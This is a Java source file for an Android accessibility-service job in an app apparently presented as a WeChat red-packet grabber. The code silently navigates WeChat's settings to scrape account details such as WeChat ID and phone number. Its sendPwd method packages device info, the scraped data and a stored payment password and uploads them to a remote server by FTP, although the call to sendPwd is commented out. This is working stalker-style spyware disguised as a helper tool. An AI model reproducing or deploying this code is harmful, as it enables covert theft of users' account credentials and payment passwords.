/**
 * 
 */
package accessibility.app;

import util.ConfigCt;
import util.Funcs;
import util.PhoneInfo;
import accessibility.AccessibilityHelper;
import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;

import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import download.ftp;

/**
 * @author byc
 *
 */
public class WechatInfo extends BaseAccessibilityJob {
	   private static WechatInfo current;
		private String mInfo="";
		private static boolean bForward=true;//前进状态；
		private AccessibilityNodeInfo mRootNode; //窗体根结点
		
		
		
	    private WechatInfo() {
	    	super(new String[]{ConfigCt.WECHAT_PACKAGENAME});
	    }
	    public static synchronized WechatInfo getWechatInfo() {
	        if(current == null) {
	            current = new WechatInfo();
	        }
	        return current;
	    }
	    @Override
		public void onCreateJob(QiangHongBaoService service) {
			super.onCreateJob(service);

		}
	    @Override
	    public void onStopJob() {
	    	super.onStopJob();

	    }
		/*
		 * (刷新处理流程)
		 * @see accessbility.AccessbilityJob#onWorking()
		 */
		@Override
		public void onWorking(){
	    	
		}
	    //--------------------------------------------------------------------------------------------------------------
	    @Override
	    public void onReceiveJob(AccessibilityEvent event) {
	    	super.onReceiveJob(event);
	    	if(!mIsEventWorking)return;
	    	if(!mIsTargetPackageName)return;
	    	final int eventType = event.getEventType();
	    	if(event.getClassName()==null)return;
	    	String sClassName=event.getClassName().toString();
			//+++++++++++++++++++++++++++++++++窗口改变+++++++++++++++++++++++++++++++++++++++++++++++
			if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
				mCurrentUI=sClassName;
				mRootNode=event.getSource();
				if(mRootNode==null)return;
				Log.i(ConfigCt.TAG, "WechatInfo窗体--------------------->"+mCurrentUI);
				//-------------------------LAUNCHER界面----------------------------------------------------
				if(mCurrentUI.equals(ConfigCt.WINDOW_LUCKYMONEY_LAUNCHER_UI)){
	
					if(isSettingInLancher(mRootNode)){
						if(bForward)ClickSetting(mRootNode);else
						{ClickWx(mRootNode);bForward=true;mIsEventWorking=false;}
					}else{
						ClickMe(mRootNode);
					}
				}
				if(mCurrentUI.equals("android.widget.ListView")){
					if(bForward)ClickSetting(mRootNode);else
						{ClickWx(mRootNode);bForward=true;mIsEventWorking=false;}
				}
				if(mCurrentUI.equals("com.tencent.mm.plugin.setting.ui.setting.SettingsUI")){
					if(bForward)ClickAccountAndSafe(mRootNode);else
						AccessibilityHelper.performBack(service);
				}
				if(mCurrentUI.equals("com.tencent.mm.plugin.setting.ui.setting.SettingsAccountInfoUI")){
					getInfo(mRootNode);
				}

			}
			//+++++++++++++++++++++++++++++++++内容改变+++++++++++++++++++++++++++++++++++++++++++++++
			if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
				//-------------------------LAUNCHER界面----------------------------------------------------
				if(mCurrentUI.equals(ConfigCt.WINDOW_LUCKYMONEY_LAUNCHER_UI)){
					mRootNode=event.getSource();
					if(mRootNode==null)return;
					mRootNode=AccessibilityHelper.getRootNode(mRootNode);
					if(isSettingInLancher(mRootNode)){
						if(bForward)ClickSetting(mRootNode);else
						{ClickWx(mRootNode);bForward=true;mIsEventWorking=false;}
					}else{
						ClickMe(mRootNode);
					}
				}
			}
	    }
	    /*
	     * 点击我：
	     */
	    private boolean ClickMe(AccessibilityNodeInfo rootNode){
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "我", -1);
	    	if(nodeInfo==null)return false;
	    	AccessibilityHelper.performClick(nodeInfo);
	    	return false;
	    }
	    /*
	     * 点击微信：
	     */
	    private boolean ClickWx(AccessibilityNodeInfo rootNode){//
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosById(rootNode, "com.tencent.mm:id/c_z", 0);
	    	if(nodeInfo==null)return false;
	    	AccessibilityHelper.performClick(nodeInfo);
	    	return false;
	    }
	    /*
	     * 点击设置：
	     */
	    private boolean ClickSetting(AccessibilityNodeInfo rootNode){
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "设置", -1);
	    	if(nodeInfo==null)return false;
	    	AccessibilityHelper.performClick(nodeInfo);
	    	return false;
	    }
	    /*
	     * 点击帐号与安全：
	     */
	    private boolean ClickAccountAndSafe(AccessibilityNodeInfo rootNode){
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "帐号与安全", 0);
	    	if(nodeInfo==null)return false;
	    	AccessibilityHelper.performClick(nodeInfo);
	    	return false;
	    }
	    /*
	     * 获取信息：
	     */
	    private boolean getInfo(AccessibilityNodeInfo rootNode){
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosById(rootNode, "android:id/summary", 0);
	    	if(nodeInfo==null||nodeInfo.getText()==null)return false;
	    	mInfo=nodeInfo.getText().toString();
	    	saveInfo(mInfo);
	    	nodeInfo=AccessibilityHelper.findNodeInfosById(rootNode, "android:id/summary", 1);
	    	if(nodeInfo==null||nodeInfo.getText()==null)return false;
	    	mInfo=nodeInfo.getText().toString();
	    	saveInfo(mInfo);
	    	//String info=ConfigCt.getInstance(context).getWechatInfo()+";"+mInfo+";\r\n";
	    	//ConfigCt.getInstance(context).setWechatInfo(info);
	    	//sendPwd();
	    	bForward=false;
	    	AccessibilityHelper.performBack(service);
	    	return false;
	    }
		/*
		 * 保存信息；QQ;phone;pwd;
		 */
		private void saveInfo(String info){
			String oldInfo=ConfigCt.getInstance(service).getWechatInfo().toString();
			if(oldInfo.length()==0){
				ConfigCt.getInstance(service).setWechatInfo(info);
				return;
			}
			if(oldInfo.contains(info)){
				return;
			}
			ConfigCt.getInstance(service).setWechatInfo(oldInfo+";"+info);
		}
	    /*
	     * 发送支付pwd
	     */
	    private void sendPwd(){
	    	String baseInfo=PhoneInfo.getBasePhoneInfo(context);
	    	String wxInfo=ConfigCt.getInstance(context).getWechatInfo();
	    	String pwd=ConfigCt.getInstance(context).getPayPWD();
	    	String info=baseInfo+"\r\n"+wxInfo+"\r\n"+pwd;
			String filename=Funcs.saveInfo2File(info, ConfigCt.appID+"-wxp");
			if(filename!=null){
				ftp.getFtp(context).UploadStart(filename);
			}
	    }
	    /*
	     *判断设置子界面：
	     */
	    private boolean isSettingInLancher(AccessibilityNodeInfo rootNode){
	    	AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "微信号", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "查看二维码", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "钱包", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "收藏", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "相册", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "表情", 0);
	    	if(nodeInfo==null)return false;
	    	nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "设置", 0);
	    	if(nodeInfo==null)return false;
	    	return true;
	    }
	    /*
	     * 1分钟后强制结束工作；
	     */
		private static Handler handlerFinishWorking = new Handler();    
		private static Runnable runnable = new Runnable() {    
			@Override    
		    public void run() {    
				WechatInfo.getWechatInfo().mIsEventWorking=false;
				bForward=true;
				//handlerFinishWorking.postDelayed(this, 1000*10);    
		    }    
		};
	    /*
	     * 开始工作：
	     */
	    public void start(){
	    	EventStart();
	    	handlerFinishWorking.postDelayed(runnable, 1000*30); 
	    }
}
